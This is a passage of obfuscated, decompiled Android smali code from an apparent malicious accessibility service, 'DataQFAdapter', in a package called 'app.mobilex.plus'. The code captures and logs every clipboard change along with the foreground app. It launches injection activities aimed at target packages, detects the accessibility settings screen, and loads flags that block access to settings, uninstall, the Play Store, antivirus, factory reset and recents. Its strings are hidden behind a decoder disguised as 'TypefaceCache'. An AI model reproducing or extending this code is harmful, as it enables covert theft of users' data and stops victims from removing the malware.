    invoke-direct {v1, p0}, Lv/s/WlzXLqWUINyncH04DOBE;-><init>(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 14
    .line 15
    .line 16
    iput-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->clipboardListener:Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;

    .line 17
    .line 18
    invoke-virtual {v0, v1}, Landroid/content/ClipboardManager;->addPrimaryClipChangedListener(Landroid/content/ClipboardManager$OnPrimaryClipChangedListener;)V

    .line 19
    .line 20
    .line 21
    const-string v0, "0000007A0052009700F200B000D300B5002700360056008800FE00B600C600A8003100360052008900F900AB00DB00A6002F007F0041008200F4"

    .line 22
    .line 23
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 24
    .line 25
    .line 26
    return-void

    .line 27
    :catch_0
    move-exception v0

    .line 28
    const-string v1, "0000007A0052009700F200B000D300B5002700360052008900F900AB009200A2003100640054009500AA00FF"

    .line 29
    .line 30
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 31
    .line 32
    .line 33
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 34
    .line 35
    .line 36
    return-void
.end method

.method private static final initClipboardMonitor$lambda$30(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 2

    .line 1
    :try_start_0
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->clipboardManager:Landroid/content/ClipboardManager;

    .line 2
    .line 3
    if-eqz v0, :cond_0

    .line 4
    .line 5
    invoke-virtual {v0}, Landroid/content/ClipboardManager;->getPrimaryClip()Landroid/content/ClipData;

    .line 6
    .line 7
    .line 8
    move-result-object v0

    .line 9
    goto/16 :goto_0

    .line 10
    :cond_0
    const/4 v0, 0x0

    .line 11
    :goto_0
    if-eqz v0, :cond_3

    .line 12
    .line 13
    invoke-virtual {v0}, Landroid/content/ClipData;->getItemCount()I

    .line 14
    .line 15
    .line 16
    move-result v1

    .line 17
    if-lez v1, :cond_3

    .line 18
    .line 19
    const/16 v1, 0x0

    .line 20
    invoke-virtual {v0, v1}, Landroid/content/ClipData;->getItemAt(I)Landroid/content/ClipData$Item;

    .line 21
    .line 22
    .line 23
    move-result-object v0

    .line 24
    invoke-virtual {v0}, Landroid/content/ClipData$Item;->getText()Ljava/lang/CharSequence;

    .line 25
    .line 26
    .line 27
    move-result-object v0

    .line 28
    if-eqz v0, :cond_1

    .line 29
    .line 30
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 31
    .line 32
    .line 33
    move-result-object v0

    .line 34
    if-nez v0, :cond_2

    .line 35
    .line 36
    :cond_1
    const-string v0, ""

    .line 37
    .line 38
    :cond_2
    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    .line 39
    .line 40
    .line 41
    move-result v1

    .line 42
    if-lez v1, :cond_3

    .line 43
    .line 44
    iget-object v1, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastClipboard:Ljava/lang/String;

    .line 45
    .line 46
    invoke-virtual {v0, v1}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 47
    .line 48
    .line 49
    move-result v1

    .line 50
    if-nez v1, :cond_3

    .line 51
    .line 52
    iput-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->lastClipboard:Ljava/lang/String;

    .line 53
    .line 54
    invoke-direct {p0, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->logClipboard(Ljava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 55
    .line 56
    .line 57
    :cond_3
    return-void

    .line 58
    :catch_0
    move-exception p0

    .line 59
    const-string v0, "0000007A0052009700F200B000D300B5002700360049008200F100BB009200A2003100640054009500AA00FF"

    .line 60
    .line 61
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 62
    .line 63
    .line 64
    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 65
    .line 66
    .line 67
    return-void
.end method

.method private static final injectRunnable$lambda$13(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 5

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->pendingInjectPkg:Ljava/lang/String;

    .line 2
    .line 3
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 4
    .line 5
    .line 6
    move-result v1

    .line 7
    if-lez v1, :cond_4

    .line 8
    .line 9
    sget-object v1, Lv/s/GQh1bKoqkKhujFH2nJ;->dDIMxZXP1V8HdM:Ljava/lang/String;

    .line 10
    .line 11
    invoke-static {v0}, Lv/s/GQh1bKoqkKhujFH2nJ;->w9sT1Swbhx3hs(Ljava/lang/String;)Z

    .line 12
    .line 13
    .line 14
    move-result v1

    .line 15
    if-eqz v1, :cond_4

    .line 16
    .line 17
    invoke-static {v0}, Lv/s/GQh1bKoqkKhujFH2nJ;->w9sT1Swbhx3hs(Ljava/lang/String;)Z

    .line 18
    .line 19
    .line 20
    move-result v1

    .line 21
    if-nez v1, :cond_0

    .line 22
    .line 23
    goto :goto_0

    .line 24
    :cond_0
    invoke-static {p0, v0}, Lv/s/GQh1bKoqkKhujFH2nJ;->vekpFI4d1Nc4fakF(Landroid/content/Context;Ljava/lang/String;)Ljava/io/File;

    .line 25
    .line 26
    .line 27
    move-result-object v1

    .line 28
    invoke-static {}, Ljava/lang/Thread;->currentThread()Ljava/lang/Thread;

    .line 29
    .line 30
    .line 31
    move-result-object v2

    .line 32
    invoke-virtual {v2}, Ljava/lang/Thread;->getName()Ljava/lang/String;

    .line 33
    .line 34
    .line 35
    if-nez v1, :cond_1

    .line 36
    .line 37
    const-string p0, "000D0079001B00AF00C4009200FE00E700250079004900C7"

    .line 38
    .line 39
    invoke-static {p0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 40
    .line 41
    .line 42
    return-void

    .line 43
    :cond_1
    sput-object v0, Lv/s/GQh1bKoqkKhujFH2nJ;->pyu8ovAipBTLYAiKab:Ljava/lang/String;

    nop

    nop

    .line 44
    .line 45
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 46
    .line 47
    .line 48
    move-result-wide v2

    .line 49
    sput-wide v2, Lv/s/GQh1bKoqkKhujFH2nJ;->D5P1xCAyuvgF:J

    .line 50
    .line 51
    :try_start_0
    new-instance v2, Landroid/content/Intent;

    .line 52
    .line 53
    const-class v3, Lapp/mobilex/plus/HelperYOLoader;

    .line 54
    .line 55
    invoke-direct {v2, p0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 56
    .line 57
    .line 58
    const/high16 v3, 0x14810000

    .line 59
    .line 60
    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    .line 61
    .line 62
    .line 63
    const-string v3, "003700770049008000F500AB00ED00B7002200750050008600F700BA"

    .line 64
    .line 65
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 66
    .line 67
    .line 68
    move-result-object v3

    .line 69
    invoke-virtual {v2, v3, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 70
    .line 71
    .line 72
    const-string v3, "00220066004B00B800FE00BE00DF00A2"

    .line 73
    .line 74
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 75
    .line 76
    .line 77
    move-result-object v3

    .line 78
    sget-object v4, Lv/s/GQh1bKoqkKhujFH2nJ;->xDyLpEZyrcKVe0:Ljava/util/concurrent/ConcurrentHashMap;

    .line 79
    .line 80
    invoke-virtual {v4, v0}, Ljava/util/concurrent/ConcurrentHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 81
    .line 82
    .line 83
    move-result-object v4

    .line 84
    check-cast v4, Ljava/lang/String;

    .line 85
    .line 86
    if-nez v4, :cond_2

    .line 87
    .line 88
    move-object/from16 v4, v0

    .line 89
    :cond_2
    invoke-virtual {v2, v3, v4}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 90
    .line 91
    .line 92
    const-string v3, "002B00620056008B00CF00AF00D300B3002B"

    .line 93
    .line 94
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 95
    .line 96
    .line 97
    move-result-object v3

    .line 98
    invoke-virtual {v1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    .line 99
    .line 100
    .line 101
    move-result-object v1

    .line 102
    invoke-virtual {v2, v3, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 103
    .line 104
    .line 105
    sget-object v1, Lv/s/GQh1bKoqkKhujFH2nJ;->ibVTtJUNfrGYbW:Ljava/util/concurrent/ConcurrentHashMap;

    nop

    .line 106
    .line 107
    invoke-virtual {v1, v0}, Ljava/util/concurrent/ConcurrentHashMap;->get(Ljava/lang/Object;)Ljava/lang/Object;

    .line 108
    .line 109
    .line 110
    move-result-object v0

    .line 111
    check-cast v0, Ljava/lang/String;

    .line 112
    .line 113
    if-eqz v0, :cond_3

    .line 114
    .line 115
    const-string v1, "002000630048009300FF00B200ED00AD0030"

    .line 116
    .line 117
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 118
    .line 119
    .line 120
    move-result-object v1

    .line 121
    invoke-virtual {v2, v1, v0}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    .line 122
    .line 123
    .line 124
    :cond_3
    invoke-virtual {p0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V

    .line 125
    .line 126
    .line 127
    const-string p0, "000A00780051008200F300AB009200B4002B0079004C008900B000B900DD00B50063"

    .line 128
    .line 129
    invoke-static {p0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 130
    .line 131
    .line 132
    return-void

    .line 133
    :catch_0
    move-exception p0

    .line 134
    const-string v0, "0030007E0054009000D900B100D800A200200062001B008200E200AD00DD00B500790036"

    .line 135
    .line 136
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 137
    .line 138
    .line 139
    invoke-virtual {p0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 140
    .line 141
    .line 142
    :cond_4
    :goto_0
    return-void
.end method

.method private static synthetic irpisbfbp()V
    .locals 1

    const-string v0, "background"

    const-string v0, "UTF-8"

    const-string v0, "net.service.mdiokztf"

    const-string v0, "accent"

    const-string v0, "TAG"

    return-void
.end method

.method private final isAccessibilitySettingsContent()Z
    .locals 6

    .line 1
    const/4 v0, 0x0

    .line 2
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 3
    .line 4
    .line 5
    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 6
    if-nez v1, :cond_0

    .line 7
    .line 8
    return v0

    .line 9
    :cond_0
    :try_start_1
    const-string v2, "003700770057008C00F200BE00D100AC"

    .line 10
    .line 11
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    move-result-object v2

    nop

    nop

    .line 15
    const-string v3, "003000610052009300F300B7009200A600200075005E009400E3"

    .line 16
    .line 17
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 18
    .line 19
    .line 20
    move-result-object v3

    .line 21
    const-string v4, "003500790052008400F500FF00D300A40020007300480094"

    .line 22
    .line 23
    invoke-static {v4}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 24
    .line 25
    .line 26
    move-result-object v4

    .line 27
    filled-new-array {v2, v3, v4}, [Ljava/lang/String;

    .line 28
    .line 29
    .line 30
    move-result-object v2

    .line 31
    invoke-static {v2}, Lv/s/Aqh0grSwgDbwr;->yTljMGnIibTRdOpSh4([Ljava/lang/Object;)Ljava/util/List;

    .line 32
    .line 33
    .line 34
    move-result-object v2

    .line 35
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 36
    .line 37
    .line 38
    move-result-object v2

    .line 39
    move v3, v0

    .line 40
    :cond_1
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    .line 41
    .line 42
    .line 43
    move-result v4

    .line 44
    if-eqz v4, :cond_2

    .line 45
    .line 46
    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 47
    .line 48
    .line 49
    move-result-object v4

    .line 50
    check-cast v4, Ljava/lang/String;

    .line 51
    .line 52
    invoke-virtual {v1, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    .line 53
    .line 54
    .line 55
    move-result-object v4

    .line 56
    if-eqz v4, :cond_1

    .line 57
    .line 58
    invoke-interface {v4}, Ljava/util/Collection;->isEmpty()Z

    .line 59
    .line 60
    .line 61
    move-result v5

    .line 62
    if-nez v5, :cond_1

    .line 63
    .line 64
    add-int/lit8 v3, v3, 0x1

    .line 65
    .line 66
    invoke-interface {v4}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    .line 67
    .line 68
    .line 69
    move-result-object v4

    .line 70
    :goto_0
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    .line 71
    .line 72
    .line 73
    move-result v5

    .line 74
    if-eqz v5, :cond_1

    .line 75
    .line 76
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 77
    .line 78
    .line 79
    move-result-object v5

    .line 80
    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 81
    .line 82
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 83
    .line 84
    .line 85
    goto/16 :goto_0

    .line 86
    :catchall_0
    move-exception v2

    .line 87
    goto :goto_1

    .line 88
    :cond_2
    const/16 v2, -0x58

    add-int/lit8 v2, v2, 0x5a

    .line 89
    if-lt v3, v2, :cond_3

    .line 90
    .line 91
    const/4 v2, 0x1

    .line 92
    :try_start_2
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 93
    .line 94
    .line 95
    return v2

    .line 96
    :cond_3
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 97
    .line 98
    .line 99
    goto/16 :goto_2

    .line 100
    :goto_1
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 101
    .line 102
    .line 103
    throw v2
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 104
    :catch_0
    :goto_2
    return v0
.end method

.method private final isImePackage(Ljava/lang/String;)Z
    .locals 3

    .line 1
    iget-object v0, p0, Lapp/mobilex/plus/services/DataQFAdapter;->imePackages:Ljava/util/Set;

    .line 2
    .line 3
    invoke-interface {v0, p1}, Ljava/util/Set;->contains(Ljava/lang/Object;)Z

    .line 4
    .line 5
    .line 6
    move-result v0

    .line 7
    const/4 v1, 0x1

    .line 8
    if-eqz v0, :cond_0

    .line 9
    .line 10
    return v1

    .line 11
    :cond_0
    :try_start_0
    const-string v0, "input_method"

    .line 12
    .line 13
    invoke-virtual {p0, v0}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 14
    .line 15
    .line 16
    move-result-object v0

    .line 17
    instance-of v2, v0, Landroid/view/inputmethod/InputMethodManager;

    .line 18
    .line 19
    if-eqz v2, :cond_1

    .line 20
    .line 21
    check-cast v0, Landroid/view/inputmethod/InputMethodManager;

    .line 22
    .line 23
    goto/16 :goto_0

    nop

    nop

    .line 24
    :cond_1
    const/16 v0, 0x0

    .line 25
    :goto_0
    if-eqz v0, :cond_3

    .line 26
    .line 27
    invoke-virtual {v0}, Landroid/view/inputmethod/InputMethodManager;->getEnabledInputMethodList()Ljava/util/List;

    .line 28
    .line 29
    .line 30
    move-result-object v0

    .line 31
    if-eqz v0, :cond_3

    .line 32
    .line 33
    invoke-interface {v0}, Ljava/lang/Iterable;->iterator()Ljava/util/Iterator;

    .line 34
    .line 35
    .line 36
    move-result-object v0

    .line 37
    :cond_2
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    .line 38
    .line 39
    .line 40
    move-result v2

    .line 41
    if-eqz v2, :cond_3

    .line 42
    .line 43
    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 44
    .line 45
    .line 46
    move-result-object v2

    .line 47
    check-cast v2, Landroid/view/inputmethod/InputMethodInfo;

    .line 48
    .line 49
    invoke-virtual {v2}, Landroid/view/inputmethod/InputMethodInfo;->getPackageName()Ljava/lang/String;

    .line 50
    .line 51
    .line 52
    move-result-object v2

    nop

    nop

    .line 53
    invoke-static {v2, p1}, Lv/s/okc5AGRjqrud84oM6d;->w9sT1Swbhx3hs(Ljava/lang/Object;Ljava/lang/Object;)Z

    .line 54
    .line 55
    .line 56
    move-result v2
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 57
    if-eqz v2, :cond_2

    .line 58
    .line 59
    return v1

    .line 60
    :catchall_0
    :cond_3
    const/4 p1, 0x0

    .line 61
    return p1
.end method

.method public static synthetic l1V0lQr6TbwNKqHfXNbb(Lapp/mobilex/plus/services/DataQFAdapter;)V
    .locals 0

    .line 1
    invoke-static {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->startGuardPollThread$lambda$17$lambda$16(Lapp/mobilex/plus/services/DataQFAdapter;)V

    .line 2
    .line 3
    .line 4
    return-void

    nop

    nop
.end method

.method private final loadUiBlockPrefs()V
    .locals 4

    .line 1
    const-string v0, "0030007E005A008300F5"

    .line 2
    .line 3
    :try_start_0
    const-string v1, "0036007F0059008B00FF00BC00D9009800330064005E008100E3"

    .line 4
    .line 5
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    move-result-object v1

    .line 9
    const/16 v2, 0x0

    .line 10
    invoke-virtual {p0, v1, v2}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    .line 11
    .line 12
    .line 13
    move-result-object v1

    .line 14
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 15
    .line 16
    .line 17
    move-result-object v3

    .line 18
    invoke-interface {v1, v3}, Landroid/content/SharedPreferences;->contains(Ljava/lang/String;)Z

    .line 19
    .line 20
    .line 21
    move-result v3

    .line 22
    if-nez v3, :cond_0

    .line 23
    .line 24
    goto/16 :goto_0

    .line 25
    .line 26
    :cond_0
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 27
    .line 28
    .line 29
    move-result-object v0

    .line 30
    const/4 v3, 0x1

    .line 31
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 32
    .line 33
    .line 34
    move-result v0

    .line 35
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Shade:Z

    .line 36
    .line 37
    const-string v0, "00300073004F0093"

    .line 38
    .line 39
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 40
    .line 41
    .line 42
    move-result-object v0

    .line 43
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 44
    .line 45
    .line 46
    move-result v0

    .line 47
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Sett:Z

    .line 48
    .line 49
    const-string v0, "00220027000A009E"

    .line 50
    .line 51
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 52
    .line 53
    .line 54
    move-result-object v0

    .line 55
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 56
    .line 57
    .line 58
    move-result v0

    nop

    nop

    .line 59
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_A11y:Z

    nop

    .line 60
    .line 61
    const-string v0, "00330079004C008200E2"

    .line 62
    .line 63
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 64
    .line 65
    .line 66
    move-result-object v0

    .line 67
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 68
    .line 69
    .line 70
    move-result v0

    .line 71
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Power:Z

    .line 72
    .line 73
    const-string v0, "0036007800520089"

    .line 74
    .line 75
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 76
    .line 77
    .line 78
    move-result-object v0

    nop

    .line 79
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 80
    .line 81
    .line 82
    move-result v0

    .line 83
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Unin:Z

    .line 84
    .line 85
    const-string v0, "002C00610055008600E000AF"

    .line 86
    .line 87
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 88
    .line 89
    .line 90
    move-result-object v0

    .line 91
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 92
    .line 93
    .line 94
    move-result v0

    .line 95
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_OwnApp:Z

    .line 96
    .line 97
    const-string v0, "0033007A005A009E"

    .line 98
    .line 99
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 100
    .line 101
    .line 102
    move-result-object v0

    .line 103
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 104
    .line 105
    .line 106
    move-result v0

    .line 107
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Play:Z

    .line 108
    .line 109
    const-string v0, "av"

    .line 110
    .line 111
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 112
    .line 113
    .line 114
    move-result v0

    .line 115
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_AV:Z

    nop

    .line 116
    .line 117
    const-string v0, "002100640054009000E300BA00C0"

    .line 118
    .line 119
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 120
    .line 121
    .line 122
    move-result-object v0

    .line 123
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 124
    .line 125
    .line 126
    move-result v0

    .line 127
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Browser:Z

    .line 128
    .line 129
    const-string v0, "0025007F0057008200E3"

    .line 130
    .line 131
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 132
    .line 133
    .line 134
    move-result-object v0

    .line 135
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 136
    .line 137
    .line 138
    move-result v0

    nop

    .line 139
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Files:Z

    .line 140
    .line 141
    const-string v0, "003100730048008200E4"

    .line 142
    .line 143
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 144
    .line 145
    .line 146
    move-result-object v0

    .line 147
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 148
    .line 149
    .line 150
    move-result v0

    .line 151
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Reset:Z

    .line 152
    .line 153
    const-string v0, "00270073004D"

    nop

    nop

    .line 154
    .line 155
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 156
    .line 157
    .line 158
    move-result-object v0

    nop

    .line 159
    invoke-interface {v1, v0, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 160
    .line 161
    .line 162
    move-result v0

    nop

    .line 163
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Dev:Z

    .line 164
    .line 165
    const-string v0, "002D0073004F"

    .line 166
    .line 167
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 168
    .line 169
    .line 170
    move-result-object v0

    .line 171
    invoke-interface {v1, v0, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 172
    .line 173
    .line 174
    move-result v0

    .line 175
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Net:Z

    .line 176
    .line 177
    const-string v0, "003100730058008200FE00AB00C1"

    .line 178
    .line 179
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 180
    .line 181
    .line 182
    move-result-object v0

    .line 183
    invoke-interface {v1, v0, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 184
    .line 185
    .line 186
    move-result v0

    .line 187
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Recents:Z

    .line 188
    .line 189
    const-string v0, "002F00790058008C"

    .line 190
    .line 191
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 192
    .line 193
    .line 194
    move-result-object v0

    .line 195
    invoke-interface {v1, v0, v3}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    .line 196
    .line 197
    .line 198
    move-result v0

    .line 199
    sput-boolean v0, Lapp/mobilex/plus/services/DataQFAdapter;->UIBlock_Lock:Z

    nop
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 200
    .line 201
    :catchall_0
    :goto_0
    return-void
.end method

.method private final logClipboard(Ljava/lang/String;)V
    .locals 10

    .line 1
    new-instance v0, Lv/s/NxAMaDFbSCxW6M03f;

    .line 2
    .line 3
    const-string v1, "0020007A0052009700F200B000D300B50027"

    .line 4
    .line 5
    invoke-static {v1}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 6
    .line 7
    .line 8
    move-result-object v1

    .line 9
    iget-object v2, p0, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 10
    .line 11
    invoke-direct {p0, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->resolveAppName(Ljava/lang/String;)Ljava/lang/String;

    .line 12
    .line 13
    .line 14
    move-result-object v3

    .line 15
    iget-object v4, p0, Lapp/mobilex/plus/services/DataQFAdapter;->currentApp:Ljava/lang/String;

    .line 16
    .line 17
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    .line 18
    .line 19
    .line 20
    move-result-wide v5

    .line 21
    const/4 v8, 0x0

    .line 22
    const/16 v9, 0x220

    add-int/lit8 v9, v9, -0x40

    .line 23
    .line 24
    const/4 v7, 0x0

    .line 25
    move-object v2, p1

    nop

    nop

    .line 26
    invoke-direct/range {v0 .. v9}, Lv/s/NxAMaDFbSCxW6M03f;-><init>(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;JLjava/lang/String;ZI)V

    .line 27
    .line 28
    .line 29
    sget-object p1, Lapp/mobilex/plus/services/DataQFAdapter;->Companion:Lv/s/GARjgaGEpTotOxcl8vfe;

    .line 30
    .line 31
    invoke-virtual {p1, v0}, Lv/s/GARjgaGEpTotOxcl8vfe;->dDIMxZXP1V8HdM(Lv/s/NxAMaDFbSCxW6M03f;)V

    .line 32
    .line 33
    .line 34
    return-void

    nop
.end method

